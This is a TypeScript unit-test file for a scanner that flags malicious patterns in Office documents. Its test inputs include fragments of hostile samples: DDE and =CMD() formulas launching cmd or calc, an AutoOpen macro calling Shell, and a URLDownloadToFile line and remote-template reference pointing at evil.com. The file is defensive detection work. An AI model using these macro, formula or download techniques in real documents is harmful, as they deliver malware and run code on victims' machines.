/**
 * Unit Tests for S11 — Document Parser: Office Module
 */

import { describe, it, expect } from 'vitest';
import { scannerRegistry } from './registry.js';
import type { Finding } from '../types.js';
import { documentOfficeModule } from './document-office.js';

function scanText(text: string): Finding[] {
  return documentOfficeModule.scan(text, text);
}

describe('document-office module', () => {
  describe('Module Registration', () => {
    it('should be registered', () => { expect(scannerRegistry.hasModule('document-office')).toBe(true); });
    it('should have correct metadata', () => { expect(documentOfficeModule.name).toBe('document-office'); });
    it('should have a positive pattern count', () => { expect(documentOfficeModule.getPatternCount()).toBeGreaterThan(0); });
    it('should return 5 pattern groups', () => { expect(documentOfficeModule.getPatternGroups()).toHaveLength(5); });
  });

  describe('DOCX Patterns', () => {
    it('should detect hidden text', () => {
      expect(scanText('<w:rPr><w:vanish/></w:rPr>').some(f => f.pattern_name === 'docx_hidden_text')).toBe(true);
    });
    it('should detect VBA project references', () => {
      expect(scanText('<Relationship Target="vbaProject.bin"/>').some(f => f.pattern_name === 'docx_vba_project_ref')).toBe(true);
    });
    it('should detect DDE field codes', () => {
      expect(scanText('<w:instrText xml:space="preserve"> DDEAUTO excel "cmd" </w:instrText>').some(f => f.pattern_name === 'docx_field_code_injection')).toBe(true);
    });
  });

  describe('XLSX Patterns', () => {
    it('should detect =CMD() formula', () => {
      expect(scanText('=CMD("calc.exe")').some(f => f.pattern_name === 'xlsx_cmd_exec_formula')).toBe(true);
    });
    it('should detect DDE formula', () => {
      expect(scanText('=DDE("cmd","/C calc","")').some(f => f.pattern_name === 'xlsx_dde_formula')).toBe(true);
    });
    it('should detect hidden sheets', () => {
      expect(scanText('<sheet name="secret" sheetId="2" state="veryHidden" r:id="rId2"/>').some(f => f.pattern_name === 'xlsx_hidden_sheet')).toBe(true);
    });
  });

  describe('Macro Patterns', () => {
    it('should detect AutoOpen', () => {
      expect(scanText('Sub AutoOpen()\n  Shell "cmd"\nEnd Sub').some(f => f.pattern_name === 'office_auto_open')).toBe(true);
    });
    it('should detect Shell/WScript', () => {
      expect(scanText('CreateObject("WScript.Shell")').some(f => f.pattern_name === 'office_shell_exec')).toBe(true);
    });
    it('should detect URLDownloadToFile', () => {
      expect(scanText('URLDownloadToFile 0, "http://evil.com/p.exe"').some(f => f.pattern_name === 'office_vba_download')).toBe(true);
    });
  });

  describe('OLE Patterns', () => {
    it('should detect ActiveX controls', () => {
      expect(scanText('<ax:ocx ax:classid="clsid:D7053240-CE69-11CD-A777-00DD01143C57"/>').some(f => f.pattern_name === 'office_activex_control')).toBe(true);
    });
    it('should detect remote template injection', () => {
      expect(scanText('<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.com/t.dotm" TargetMode="External"/>').some(f => f.pattern_name === 'office_template_injection')).toBe(true);
    });
  });

  describe('Clean Content', () => {
    it('should not flag clean text', () => { expect(scanText('Revenue increased by 15%.')).toHaveLength(0); });
    it('should not flag normal formulas', () => { expect(scanText('=SUM(A1:A10) + AVERAGE(B1:B10)')).toHaveLength(0); });
  });

  describe('DoS Protection', () => {
    it('should handle oversized input', () => {
      const findings = scanText('A'.repeat(6_000_000));
      expect(findings).toHaveLength(1);
      expect(findings[0].category).toBe('OFFICE_DOS_PROTECTION');
    });
  });
});
